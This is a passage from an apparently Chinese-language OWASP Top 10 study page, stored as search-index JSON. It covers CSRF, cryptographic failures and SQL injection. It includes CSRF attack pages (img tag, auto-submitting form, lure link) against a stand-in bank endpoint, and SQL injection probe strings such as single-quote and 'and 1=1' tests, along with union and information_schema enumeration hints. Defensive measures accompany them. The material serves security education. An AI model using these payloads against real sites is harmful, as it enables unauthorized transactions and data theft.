<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;body&gt;\n    &lt;h1&gt;\u9ed1\u5ba2\u7684\u7ad9\u70b9&lt;/h1&gt;\n    &lt;img src=\"https://www.bank.com/withdraw?amount=1000?for=hacker\" /&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u9ed1\u5ba2\u5c06\u8f6c\u8d26\u7684\u8bf7\u6c42\u63a5\u53e3\u9690\u85cf\u5728 img \u6807\u7b7e\u5185\uff0c\u6b3a\u9a97\u6d4f\u89c8\u5668\u8fd9\u662f\u4e00\u5f20\u56fe\u7247\u8d44\u6e90\u3002\u5f53\u8be5\u9875\u9762\u88ab\u52a0\u8f7d\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u53d1\u8d77 img \u7684\u8d44\u6e90\u8bf7\u6c42\uff0c\u5982\u679c\u670d\u52a1\u5668\u6ca1\u6709\u5bf9\u8be5\u8bf7\u6c42\u505a\u5224\u65ad\u7684\u8bdd\uff0c\u90a3\u4e48\u670d\u52a1\u5668\u5c31\u4f1a\u8ba4\u4e3a\u8be5\u8bf7\u6c42\u662f\u4e00\u4e2a\u8f6c\u8d26\u8bf7\u6c42\uff0c\u4e8e\u662f\u7528\u6237\u8d26\u6237\u4e0a\u7684 100 \u5c31\u88ab\u8f6c\u79fb\u5230\u9ed1\u5ba2\u7684\u8d26\u6237\u4e0a\u53bb\u4e86\u3002</p> <ul> <li>POST \u7c7b\u578b\uff1a\u4f8b\u5982\u8868\u5355\u4e2d\u7684 POST \u8bf7\u6c42</li> </ul> <pre><code>&lt;form action=\"http://bank.com/withdraw\" method=\"POST\"&gt;\n  &lt;input type=\"hidden\" name=\"account\" value=\"xiaoming\" /&gt;\n  &lt;input type=\"hidden\" name=\"amount\" value=\"10000\" /&gt;\n  &lt;input type=\"hidden\" name=\"for\" value=\"hacker\" /&gt;\n&lt;/form&gt;\n&lt;script&gt;\n  document.forms[0].submit();\n&lt;/script&gt;\n</code></pre> <p>\u8bbf\u95ee\u8be5\u9875\u9762\u540e\uff0c\u8868\u5355\u4f1a\u81ea\u52a8\u63d0\u4ea4\uff0c\u76f8\u5f53\u4e8e\u6a21\u62df\u7528\u6237\u5b8c\u6210\u4e86\u4e00\u6b21 POST \u64cd\u4f5c\u3002</p> <ul> <li>\u5f15\u8bf1\u7528\u6237\u70b9\u51fb\uff1a\u4f8b\u5982 a \u6807\u7b7e</li> </ul> <pre><code>&lt;a href=\"http://bank.com/withdraw?amount=1000&amp;for=hacker\" taget=\"_blank\"\n  &gt;\u91cd\u78c5\u6d88\u606f\uff01\uff01&lt;a\n/&gt;&lt;/a&gt;\n</code></pre> <p>\u53ea\u8981\u7528\u6237\u70b9\u51fb\u4e86\uff0c\u5c31\u4f1a\u88ab\u653b\u51fb\u6210\u529f</p> <p>CSRF vs XSS</p> <p>\u4e0e XSS \u4e0d\u540c\u7684\u662f\uff0cCSRF \u653b\u51fb\u4e0d\u9700\u8981\u5c06\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u7528\u6237\u7684\u9875\u9762\uff0c\u4ec5\u4ec5\u662f\u5229\u7528\u670d\u52a1\u5668\u7684\u6f0f\u6d1e\u548c\u7528\u6237\u7684\u767b\u5f55\u72b6\u6001\u6765\u5b9e\u65bd\u653b\u51fb</p> <ul> <li>\u76ee\u6807\u7ad9\u70b9\u4e00\u5b9a\u8981\u6709 CSRF \u6f0f\u6d1e\uff1b</li> </ul> <p>\u540e\u53f0\u63a5\u53e3\u4e00\u5b9a\u662f\u6709\u95ee\u9898\u7684\uff0cwww.bank.com/withdraw?pa\u2026,\u8fd9\u6837\u7684\u8bdd\u653b\u51fb\u8005\u624d\u6709\u673a\u4f1a\u3002</p> <ul> <li> <p>\u7528\u6237\u8981\u767b\u5f55\u8fc7\u76ee\u6807\u7ad9\u70b9\uff0c\u5e76\u4e14\u5728\u6d4f\u89c8\u5668\u4e0a\u4fdd\u6301\u6709\u8be5\u7ad9\u70b9\u7684\u767b\u5f55\u72b6\u6001\uff1b</p> </li> <li> <p>\u9700\u8981\u7528\u6237\u6253\u5f00\u4e00\u4e2a\u7b2c\u4e09\u65b9\u7ad9\u70b9\uff0c\u53ef\u4ee5\u662f\u9ed1\u5ba2\u7684\u7ad9\u70b9\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e9b\u8bba\u575b\u3002</p> </li> </ul> <p>\u653b\u51fb\u4e00\u822c\u53d1\u8d77\u5728\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u800c\u4e0d\u662f\u88ab\u653b\u51fb\u7684\u7f51\u7ad9\u3002\u88ab\u653b\u51fb\u7684\u7f51\u7ad9\u65e0\u6cd5\u9632\u6b62\u653b\u51fb\u53d1\u751f\u3002 \u653b\u51fb\u5229\u7528\u53d7\u5bb3\u8005\u5728\u88ab\u653b\u51fb\u7f51\u7ad9\u7684\u767b\u5f55\u51ed\u8bc1\uff0c\u5192\u5145\u53d7\u5bb3\u8005\u63d0\u4ea4\u64cd\u4f5c\uff1b\u800c\u4e0d\u662f\u76f4\u63a5\u7a83\u53d6\u6570\u636e\uff0c\u6574\u4e2a\u8fc7\u7a0b\u653b\u51fb\u8005\u5e76\u4e0d\u80fd\u83b7\u53d6\u5230\u53d7\u5bb3\u8005\u7684\u767b\u5f55\u51ed\u8bc1\uff0c\u4ec5\u4ec5\u662f\u201c\u5192\u7528\u201d\u3002 \u8de8\u7ad9\u8bf7\u6c42\u53ef\u4ee5\u7528\u5404\u79cd\u65b9\u5f0f\uff1a\u56fe\u7247 URL\u3001\u8d85\u94fe\u63a5\u3001CORS\u3001Form \u63d0\u4ea4\u7b49\u7b49\u3002\u90e8\u5206\u8bf7\u6c42\u65b9\u5f0f\u53ef\u4ee5\u76f4\u63a5\u5d4c\u5165\u5728\u7b2c\u4e09\u65b9\u8bba\u575b\u3001\u6587\u7ae0\u4e2d\uff0c\u96be\u4ee5\u8fdb\u884c\u8ffd\u8e2a\u3002 CSRF \u901a\u5e38\u662f\u8de8\u57df\u7684\uff0c\u56e0\u4e3a\u5916\u57df\u901a\u5e38\u66f4\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u638c\u63a7\u3002\u4f46\u662f\u5982\u679c\u672c\u57df\u4e0b\u6709\u5bb9\u6613\u88ab\u5229\u7528\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u53ef\u4ee5\u53d1\u56fe\u548c\u94fe\u63a5\u7684\u8bba\u575b\u548c\u8bc4\u8bba\u533a\uff0c\u653b\u51fb\u53ef\u4ee5\u76f4\u63a5\u5728\u672c\u57df\u4e0b\u8fdb\u884c\uff0c\u800c\u4e14\u8fd9\u79cd\u653b\u51fb\u66f4\u52a0\u5371\u9669\u3002</p> <p>\u9632\u5fa1\u7b56\u7565</p> <p>CSRF \u901a\u5e38\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u53d1\u8d77\uff0c\u88ab\u653b\u51fb\u7684\u7f51\u7ad9\u65e0\u6cd5\u9632\u6b62\u653b\u51fb\u53d1\u751f\uff0c\u53ea\u80fd\u901a\u8fc7\u589e\u5f3a\u81ea\u5df1\u7f51\u7ad9\u9488\u5bf9 CSRF \u7684\u9632\u62a4\u80fd\u529b\u6765\u63d0\u5347\u5b89\u5168\u6027\u3002</p> <p>\u2460 \u540c\u6e90\u68c0\u6d4b</p> <p>\u65e2\u7136 CSRF \u5927\u591a\u6765\u81ea\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u76f4\u63a5\u7981\u6b62\u5916\u57df\uff08\u6216\u8005\u4e0d\u53d7\u4fe1\u4efb\u7684\u57df\u540d\uff09\u5bf9\u6211\u4eec\u53d1\u8d77\u8bf7\u6c42\u3002</p> <p>\u8bf7\u6c42\u5934\u6709 Origin Header\u3001Referer Header\uff0c\u8fd9\u4e24\u4e2a Header \u5728\u6d4f\u89c8\u5668\u53d1\u8d77\u8bf7\u6c42\u65f6\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4f1a\u81ea\u52a8\u5e26\u4e0a\uff0c\u5e76\u4e14\u4e0d\u80fd\u7531\u524d\u7aef\u81ea\u5b9a\u4e49\u5185\u5bb9\u3002 \u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u89e3\u6790\u8fd9\u4e24\u4e2a Header \u4e2d\u7684\u57df\u540d\uff0c\u786e\u5b9a\u8bf7\u6c42\u7684\u6765\u6e90\u57df\u3002</p> <p>Origin \u5b57\u6bb5\u5185\u5305\u542b\u8bf7\u6c42\u7684\u57df\u540d\uff0c\u5982\u679c Origin \u5b58\u5728\uff0c\u90a3\u4e48\u76f4\u63a5\u4f7f\u7528 Origin \u4e2d\u7684\u5b57\u6bb5\u786e\u8ba4\u6765\u6e90\u57df\u540d\u5c31\u53ef\u4ee5\uff0c\u4f46\u6709\u65f6\u5019 Origin \u4e0d\u5b58\u5728\uff0c\u6839\u636e HTTP \u534f\u8bae\uff0c\u5728 HTTP \u5934\u4e2d\u6709\u4e00\u4e2a\u5b57\u6bb5\u53eb Referer\uff0c\u8bb0\u5f55\u4e86\u8be5 HTTP \u8bf7\u6c42\u7684\u6765\u6e90\u5730\u5740\uff0c\u56e0\u6b64\uff0c\u670d\u52a1\u5668\u7684\u7b56\u7565\u662f\u4f18\u5148\u5224\u65ad Origin\uff0c\u5982\u679c\u8bf7\u6c42\u5934\u4e2d\u6ca1\u6709\u5305\u542b Origin \u5c5e\u6027\uff0c\u518d\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u5224\u65ad\u662f\u5426\u4f7f\u7528 Referer \u503c\uff0c\u4ece\u800c\u589e\u52a0\u653b\u51fb\u96be\u5ea6\u3002</p> <p>\u2461Samesite Cookie</p> <p>\u4e3a\u4e86\u4ece\u6e90\u5934\u4e0a\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cGoogle \u8d77\u8349\u4e86\u4e00\u4efd\u8349\u6848\u6765\u6539\u8fdb HTTP \u534f\u8bae\uff0c\u90a3\u5c31\u662f\u4e3a Set-Cookie \u54cd\u5e94\u5934\u65b0\u589e Samesite \u5c5e\u6027\uff0c\u5b83\u7528\u6765\u6807\u660e\u8fd9\u4e2a Cookie \u662f\u4e2a\u201c\u540c\u7ad9 Cookie\u201d\uff0c\u540c\u7ad9 Cookie \u53ea\u80fd\u4f5c\u4e3a\u7b2c\u4e00\u65b9 Cookie\uff0c\u4e0d\u80fd\u4f5c\u4e3a\u7b2c\u4e09\u65b9 Cookie\uff0cSamesite \u6709\u4e09\u4e2a\u5c5e\u6027\u503c\uff0c\u5206\u522b\u662f Strict \u548c Lax\uff0cNone\u3002</p> <p>Samesite=Strict \u65f6\u8868\u660e\u8fd9\u4e2a Cookie \u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u4e0d\u53ef\u80fd\u4f5c\u4e3a\u7b2c\u4e09\u65b9 Cookie\uff0c\u7edd\u65e0\u4f8b\u5916\u3002</p> <p>Samesite=Lax \u8fd9\u79cd\u79f0\u4e3a\u5bbd\u677e\u6a21\u5f0f\uff0c\u6bd4 Strict \u653e\u5bbd\u4e86\u70b9\u9650\u5236\uff1a\u5047\u5982\u8fd9\u4e2a\u8bf7\u6c42\u662f\u8fd9\u79cd\u8bf7\u6c42\uff08\u6539\u53d8\u4e86\u5f53\u524d\u9875\u9762\u6216\u8005\u6253\u5f00\u4e86\u65b0\u9875\u9762\uff09\u4e14\u540c\u65f6\u662f\u4e2a GET \u8bf7\u6c42\uff0c\u5219\u8fd9\u4e2a Cookie \u53ef\u4ee5\u4f5c\u4e3a\u7b2c\u4e09\u65b9 Cookie\u3002</p> <p>\u6bd4\u5982\u8bf4 b.com \u8bbe\u7f6e\u4e86\u5982\u4e0b Cookie\uff1a</p> <pre><code>Set-Cookie: foo=1; Samesite=Strict\nSet-Cookie: bar=2; Samesite=Lax\nSet-Cookie: baz=3\n</code></pre> <p>\u5f53\u7528\u6237\u4ece a.com \u70b9\u51fb\u94fe\u63a5\u8fdb\u5165 b.com \u65f6\uff0cfoo \u8fd9\u4e2a Cookie \u4e0d\u4f1a\u88ab\u5305\u542b\u5728 Cookie \u8bf7\u6c42\u5934\u4e2d\uff0c\u4f46 bar \u548c baz \u4f1a\uff0c\u4e5f\u5c31\u662f\u8bf4\u7528\u6237\u5728\u4e0d\u540c\u7f51\u7ad9\u4e4b\u95f4\u901a\u8fc7\u94fe\u63a5\u8df3\u8f6c\u662f\u4e0d\u53d7\u5f71\u54cd\u4e86\u3002</p> <p>\u4f46\u5047\u5982\u8fd9\u4e2a\u8bf7\u6c42\u662f\u4ece a.com \u53d1\u8d77\u7684\u5bf9 b.com \u7684\u5f02\u6b65\u8bf7\u6c42\uff0c\u6216\u8005\u9875\u9762\u8df3\u8f6c\u662f\u901a\u8fc7\u8868\u5355\u7684 post \u63d0\u4ea4\u89e6\u53d1\u7684\uff0c\u5219 bar \u4e5f\u4e0d\u4f1a\u53d1\u9001\u3002</p> <p>\u2462 \u63d0\u4ea4\u65f6\u8981\u6c42\u9644\u52a0\u672c\u57df\u624d\u80fd\u83b7\u53d6\u7684\u4fe1\u606f\uff08token/\u53cc\u91cd cookie\uff09</p>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#token-local-strage","title":"Token\uff1a\u5b58\u5728\u672c\u5730 local strage \u4e2d\u7684\u52a0\u5bc6\u6570\u636e","text":"<p>token \u662f\u4e00\u4e2a\u6bd4\u8f83\u6709\u6548\u7684 CSRF \u9632\u62a4\u65b9\u6cd5\uff0c\u53ea\u8981\u9875\u9762\u6ca1\u6709 XSS \u6f0f\u6d1e\u6cc4\u9732 Token\uff0c\u90a3\u4e48\u63a5\u53e3\u7684 CSRF \u653b\u51fb\u5c31\u65e0\u6cd5\u6210\u529f\uff0c\u4e5f\u662f\u73b0\u5728\u4e3b\u6d41\u7684\u89e3\u51b3\u65b9\u6848\u3002</p> <p>\u53cc\u91cd cookie\uff1a\u5229\u7528 csrf \u4e0d\u80fd\u83b7\u53d6\u672c\u5730 cookie \u7684\u7279\u70b9\u3002</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u524d\u7aef\u5b89\u5168\u7cfb\u5217\uff08\u4e8c\uff09\uff1a\u5982\u4f55\u9632\u6b62 CSRF \u653b\u51fb\uff1f</li> <li>csrf \u8be6\u89e3</li> </ul>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a02-cryptographic-failures","title":"A02 Cryptographic Failures\uff08\u52a0\u5bc6\u6545\u969c\uff09","text":"<p>\u4ee5\u524d\u79f0\u4e3a Sensitive Data Exposure\uff08\u654f\u611f\u6570\u636e\u6cc4\u9732\uff09\uff0c\u8fd9\u662f\u5e7f\u6cdb\u7684\u75c7\u72b6\uff0c\u800c\u4e0d\u662f\u6839\u672c\u539f\u56e0\u3002</p> <p>\u56e0\u6b64\u6b64\u5904\u91cd\u65b0\u5173\u6ce8\u7684\u662f\u4e0e\u52a0\u5bc6\u76f8\u5173\u7684\u6545\u969c\uff0c\u8fd9\u901a\u5e38\u4f1a\u5bfc\u81f4\u654f\u611f\u6570\u636e\u6cc4\u9732\u6216\u7cfb\u7edf\u6cc4\u9732\u3002</p> <p>\u98ce\u9669\u8bf4\u660e</p> <p>\u9996\u5148\u8981\u786e\u8ba4\uff1a\u5bf9\u4f20\u8f93\u4e2d\u7684\u6570\u636e\u548c\u5b58\u50a8\u6570\u636e\u90fd\u6709\u54ea\u4e9b\u4fdd\u62a4\u9700\u6c42\u3002\u4f8b\u5982\uff1a\u5bc6\u7801\u3001\u4fe1\u7528\u5361\u53f7\u3001\u533b\u7597\u8bb0\u5f55\u3001\u4e2a\u4eba\u4fe1\u606f\u548c\u5546\u4e1a\u79d8\u5bc6\u9700\u8981\u989d\u5916\u4fdd\u62a4\u3002 \u5bf9\u4e8e\u6570\u636e\uff0c\u8981\u786e\u8ba4\uff1a</p> <ul> <li>\u5728\u4f20\u8f93\u6570\u636e\u8fc7\u7a0b\u4e2d\u662f\u5426\u4f7f\u7528\u660e\u6587\u4f20\u8f93\uff1f\u8fd9\u548c\u4f20\u8f93\u534f\u8bae\u6709\u5173\uff1aHTTP\u3001SMTP\u3001\u7ecf\u8fc7 TLS \u5347\u7ea7\u7684 FTP\u3002\u5916\u90e8\u7f51\u7edc\u6d41\u91cf\u662f\u6709\u5bb3\u7684\uff0c\u9700\u8981\u9a8c\u8bc1\u6240\u6709\u7684\u5185\u90e8\u901a\u4fe1</li> <li>\u65e0\u8bba\u662f\u5728\u9ed8\u8ba4\u60c5\u51b5\u8fd8\u662f\u5728\u65e7\u7684\u4ee3\u7801\u4e2d\uff0c\u662f\u5426\u8fd8\u5728\u4f7f\u7528\u4efb\u4f55\u65e7\u6216\u8005\u8106\u5f31\u7684\u52a0\u5bc6\u7b97\u6cd5\u6216\u4f20\u8f93\u534f\u8bae</li> <li>\u662f\u5426\u9ed8\u8ba4\u4f7f\u7528\u52a0\u5bc6\u5bc6\u94a5\u3001\u751f\u6210\u6216\u91cd\u590d\u4f7f\u7528\u8106\u5f31\u7684\u52a0\u5bc6\u5bc6\u94a5\uff0c\u6216\u8005\u662f\u5426\u7f3a\u5c11\u9002\u5f53\u7684\u5bc6\u94a5\u7ba1\u7406\u6216\u5bc6\u94a5\u56de\u8f6c</li> <li>\u63a5\u6536\u5230\u7684\u670d\u52a1\u5668\u8bc1\u4e66\u548c\u4fe1\u4efb\u94fe\u662f\u5426\u7ecf\u8fc7\u6b63\u786e\u9a8c\u8bc1</li> </ul> <p>\u5982\u4f55\u9632\u8303</p> <ul> <li> <p>\u5bf9\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u3001\u5b58\u50a8\u6216\u8005\u4f20\u8f93\u7684\u6570\u636e\u5206\u7c7b\uff0c\u5e76\u6839\u636e\u76f8\u5173\u8981\u6c42\u786e\u8ba4\u54ea\u4e9b\u6570\u636e\u654f\u611f</p> </li> <li> <p>\u5bf9\u4e8e\u6ca1\u6709\u5fc5\u8981\u5b58\u50a8\u7684\u654f\u611f\u6570\u636e\uff0c\u5e94\u5f53\u5c3d\u5feb\u6e05\u9664</p> </li> <li> <p>\u786e\u4fdd\u52a0\u5bc6\u5b58\u50a8\u6240\u6709\u7684\u654f\u611f\u6570\u636e</p> </li> <li> <p>\u786e\u4fdd\u4f7f\u7528\u4e86\u6700\u65b0\u7684\uff0c\u5f3a\u5927\u7684\u6807\u51c6\u7b97\u6cd5\u3001\u534f\u8bae\u548c\u5bc6\u94a5\uff0c\u5e76\u4e14\u5bc6\u94a5\u7ba1\u7406\u5230\u4f4d</p> </li> <li> <p>\u7981\u7528\u7f13\u5b58\u5bf9\u5305\u542b\u654f\u611f\u6570\u636e\u7684\u54cd\u5e94</p> </li> <li> <p>\u4e0d\u8981\u4f7f\u7528\u4f20\u7edf\u534f\u8bae HTTP\u3001FTP \u7b49\u6765\u4f20\u8f93\u654f\u611f\u6570\u636e</p> </li> </ul>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a03-injection","title":"\u91cd\u70b9\u4e8c\uff1aA03 Injection\uff08\u6ce8\u5165\uff09","text":"<p>\u5e38\u89c1\u7684 CWE\uff1a\u8de8\u7ad9\u70b9\u811a\u672c\uff08xss\uff09\u3001SQL \u6ce8\u5165\u3001\u6587\u4ef6\u540d\u6216\u8def\u5f84\u7684\u5916\u90e8\u63a7\u5236</p> <p>\u4ece 2017 \u5e74\u7684\u7b2c\u4e00\u964d\u4f4e\u81f3\u7b2c\u4e09</p> <p>\u5982\u4f55\u9632\u8303</p> <ul> <li> <p>\u4f7f\u7528\u80af\u5b9a\u6216\u8005\u767d\u540d\u5355\u670d\u52a1\u5668\u7aef\u5bf9\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1</p> </li> <li> <p>\u5bf9\u4e8e\u4efb\u4f55\u6b8b\u4f59\u7684\u52a8\u6001\u67e5\u8be2\uff0c\u4f7f\u7528\u8be5\u89e3\u91ca\u5668\u7684 \u7279\u5b9a\u8f6c\u4e49\u8bed\u6cd5\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26</p> </li> <li>\u5728\u67e5\u8be2\u4e2d\u4f7f\u7528 LIMIT \u548c\u5176\u4ed6 SQL \u63a7\u4ef6\uff0c\u4ee5\u9632\u6b62\u5728 SQL \u6ce8\u5165\u7684\u60c5\u51b5\u4e0b\u5927\u91cf\u62ab\u9732\u8bb0\u5f55</li> <li>\u5e94\u7528 Web \u5e94\u7528\u9632\u706b\u5899\uff08WAF\uff09</li> </ul> <p>\u5224\u65ad\u662f\u5426\u5b58\u5728 Sql \u6ce8\u5165\u6f0f\u6d1e</p> <p>\u6700\u4e3a\u7ecf\u5178\u7684 \u5355\u5f15\u53f7\u5224\u65ad\u6cd5\uff0c\u5728\u53c2\u6570\u540e\u9762\u52a0\u4e0a\u5355\u5f15\u53f7,\u6bd4\u5982:</p> <pre><code>http://xxx/abc.php?id=1'\n</code></pre> <p>\u5982\u679c\u9875\u9762\u8fd4\u56de\u9519\u8bef\uff0c\u5219\u5b58\u5728 Sql \u6ce8\u5165\u3002\u5176\u539f\u56e0\u662f\u65e0\u8bba\u5b57\u7b26\u578b\u8fd8\u662f\u6574\u578b\u90fd\u4f1a\u56e0\u4e3a\u5355\u5f15\u53f7\u4e2a\u6570\u4e0d\u5339\u914d\u800c\u62a5\u9519\u3002</p> <p>\u5982\u679c\u672a\u62a5\u9519\uff0c\u4e0d\u4ee3\u8868\u4e0d\u5b58\u5728 Sql \u6ce8\u5165\uff0c\u56e0\u4e3a\u6709\u53ef\u80fd\u9875\u9762\u5bf9\u5355\u5f15\u53f7\u505a\u4e86\u8fc7\u6ee4\uff0c\u8fd9\u65f6\u53ef\u4ee5\u4f7f\u7528\u5224\u65ad\u8bed\u53e5\u8fdb\u884c\u6ce8\u5165\u3002</p> <p>\u2460 \u662f\u5426\u5b58\u5728\u6570\u5b57\u578b\u6ce8\u5165</p> <p>\u5f53\u8f93\u5165\u7684\u53c2 x \u4e3a\u6574\u578b\u65f6\uff0c\u901a\u5e38 abc.php \u4e2d Sql \u8bed\u53e5\u7c7b\u578b\u5927\u81f4\u5982\u4e0b\uff1a <code>select * from &lt;\u8868\u540d&gt; where id = x</code> \u8fd9\u79cd\u7c7b\u578b\u53ef\u4ee5\u4f7f\u7528\u7ecf\u5178\u7684 <code>and 1=1</code> \u548c <code>and 1=2</code> \u6765\u5224\u65ad\uff1a</p> <ul> <li>Url \u5730\u5740\u4e2d\u8f93\u5165 <code>http://xxx/abc.php?id= x and 1=1</code> \u9875\u9762\u4f9d\u65e7\u8fd0\u884c\u6b63\u5e38\uff0c\u7ee7\u7eed\u8fdb\u884c\u4e0b\u4e00\u6b65\u3002</li> <li>Url \u5730\u5740\u4e2d\u7ee7\u7eed\u8f93\u5165 <code>http://xxx/abc.php?id= x and 1=2</code> \u9875\u9762\u8fd0\u884c\u9519\u8bef\uff0c\u5219\u8bf4\u660e\u6b64 Sql \u6ce8\u5165\u4e3a\u6570\u5b57\u578b\u6ce8\u5165\u3002</li> </ul> <p>\u539f\u56e0\u5982\u4e0b\uff1a \u5f53\u8f93\u5165 <code>and 1=1</code>\u65f6\uff0c\u540e\u53f0\u6267\u884c Sql \u8bed\u53e5\uff1a</p> <pre><code>select * from &lt;\u8868\u540d&gt; where id = x and 1=1\n</code></pre> <p>\u6ca1\u6709\u8bed\u6cd5\u9519\u8bef\u4e14\u903b\u8f91\u5224\u65ad\u4e3a\u6b63\u786e\uff0c\u6240\u4ee5\u8fd4\u56de\u6b63\u5e38\u3002</p> <p>\u5f53\u8f93\u5165 <code>and 1=2</code>\u65f6\uff0c\u540e\u53f0\u6267\u884c Sql \u8bed\u53e5\uff1a</p> <pre><code>select * from &lt;\u8868\u540d&gt; where id = x and 1=2\n</code></pre> <p>\u6ca1\u6709\u8bed\u6cd5\u9519\u8bef\u4f46\u662f\u903b\u8f91\u5224\u65ad\u4e3a\u5047\uff0c\u6240\u4ee5\u8fd4\u56de\u9519\u8bef\u3002</p> <p>\u6211\u4eec\u518d\u4f7f\u7528\u5047\u8bbe\u6cd5\uff1a\u5982\u679c\u8fd9\u662f\u5b57\u7b26\u578b\u6ce8\u5165\u7684\u8bdd\uff0c\u6211\u4eec\u8f93\u5165\u4ee5\u4e0a\u8bed\u53e5\u4e4b\u540e\u5e94\u8be5\u51fa\u73b0\u5982\u4e0b\u60c5\u51b5\uff1a</p> <pre><code>select * from &lt;\u8868\u540d&gt; where id = 'x and 1=1'\nselect * from &lt;\u8868\u540d&gt; where id = 'x and 1=2'\n</code></pre> <p>\u67e5\u8be2\u8bed\u53e5\u5c06 and \u8bed\u53e5\u5168\u90e8\u8f6c\u6362\u4e3a\u4e86\u5b57\u7b26\u4e32\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c and \u7684\u903b\u8f91\u5224\u65ad\uff0c\u6240\u4ee5\u4e0d\u4f1a\u51fa\u73b0\u4ee5\u4e0a\u7ed3\u679c\uff0c\u6545\u5047\u8bbe\u662f\u4e0d\u6210\u7acb\u7684\u3002</p> <p>\u2461 \u662f\u5426\u5b58\u5728\u5b57\u7b26\u578b\u6ce8\u5165</p> <p>\u5f53\u8f93\u5165\u7684\u53c2 x \u4e3a\u5b57\u7b26\u578b\u65f6\uff0c\u901a\u5e38 abc.php \u4e2d SQL \u8bed\u53e5\u7c7b\u578b\u5927\u81f4\u5982\u4e0b\uff1a <code>select * from &lt;\u8868\u540d&gt; where id = 'x'</code> \u8fd9\u79cd\u7c7b\u578b\u6211\u4eec\u540c\u6837\u53ef\u4ee5\u4f7f\u7528 <code>and '1'='1</code> \u548c <code>and '1'='2</code>\u6765\u5224\u65ad\uff1a</p> <ul> <li>Url \u5730\u5740\u4e2d\u8f93\u5165 <code>http://xxx/abc.php?id= x' and '1'='1</code> \u9875\u9762\u8fd0\u884c\u6b63\u5e38\uff0c\u7ee7\u7eed\u8fdb\u884c\u4e0b\u4e00\u6b65\u3002</li> <li>Url \u5730\u5740\u4e2d\u7ee7\u7eed\u8f93\u5165 <code>http://xxx/abc.php?id= x' and '1'='2</code> \u9875\u9762\u8fd0\u884c\u9519\u8bef\uff0c\u5219\u8bf4\u660e\u6b64 Sql \u6ce8\u5165\u4e3a\u5b57\u7b26\u578b\u6ce8\u5165\u3002</li> </ul> <p>\u539f\u56e0\u5982\u4e0b\uff1a \u5f53\u8f93\u5165 <code>and '1'='1</code>\u65f6\uff0c\u540e\u53f0\u6267\u884c Sql \u8bed\u53e5\uff1a</p> <pre><code>select * from &lt;\u8868\u540d&gt; where id = 'x' and '1'='1'\n</code></pre> <p>\u8bed\u6cd5\u6b63\u786e\uff0c\u903b\u8f91\u5224\u65ad\u6b63\u786e\uff0c\u6240\u4ee5\u8fd4\u56de\u6b63\u786e\u3002</p> <p>\u5f53\u8f93\u5165 <code>and '1'='2</code>\u65f6\uff0c\u540e\u53f0\u6267\u884c Sql \u8bed\u53e5\uff1a</p> <pre><code>select * from &lt;\u8868\u540d&gt; where id = 'x' and '1'='2'\n</code></pre> <p>\u8bed\u6cd5\u6b63\u786e\uff0c\u4f46\u903b\u8f91\u5224\u65ad\u9519\u8bef\uff0c\u6240\u4ee5\u8fd4\u56de\u6b63\u786e\u3002\u540c\u5b66\u4eec\u540c\u6837\u53ef\u4ee5\u4f7f\u7528\u5047\u8bbe\u6cd5\u6765\u9a8c\u8bc1\u3002</p> <p>mysql \u4e0d\u77e5\u9053\u5217\u540d\u600e\u4e48\u7206\u5b57\u6bb5\uff1f</p> <p>\u67e5\u8be2 information_schema \u8868</p> <p>\u8ffd\u95ee\uff0c\u8fd9\u4e2a\u8868\u65e0\u6743\u8bbf\u95ee\u600e\u4e48\u529e\uff1f</p> <p>\u5229\u7528 union \u67e5\u8be2\uff0c\u8fdb\u884c\u67e5\u8be2\u65f6\u8bed\u53e5\u7684\u5b57\u6bb5\u6570\u5fc5\u987b\u548c\u6307\u5b9a\u8868\u4e2d\u7684\u5b57\u6bb5\u6570\u4e00\u6837\uff0c\u4e0d\u80fd\u591a\u4e5f\u4e0d\u80fd\u5c11\uff0c\u4e0d\u7136\u5c31\u4f1a\u62a5\u9519\uff0c\u4f8b\u5982\uff1a<code>Select 1,2,3 union select * from xxx;</code> \uff08xxx \u8868\u6709\u4e09\u5217\uff09\uff0c\u7ed3\u679c\u4e3a\u4e09\u5217\u3002</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>sql \u6ce8\u5165\u57fa\u7840\u539f\u7406</li> </ul>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a04-insecure-design","title":"A04 Insecure Design\uff08\u4e0d\u5b89\u5168\u7684\u8bbe\u8ba1\uff09","text":"<p>2021 \u7248\u65b0\u589e\u7684</p> <p>\u4fa7\u91cd\u4e8e\u8bbe\u8ba1\u548c\u4f53\u7cfb\u7ed3\u6784\u7f3a\u9677\u76f8\u5173\u7684\u98ce\u9669\uff0c\u547c\u5401\u66f4\u591a\u7684\u4f7f\u7528\u5a01\u80c1\u5efa\u6a21\u3001\u5b89\u5168\u8bbe\u8ba1\u6a21\u5f0f\u548c\u53c2\u8003\u4f53\u7cfb\u7ed3\u6784</p>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a05-security-misconfiguration","title":"A05 Security 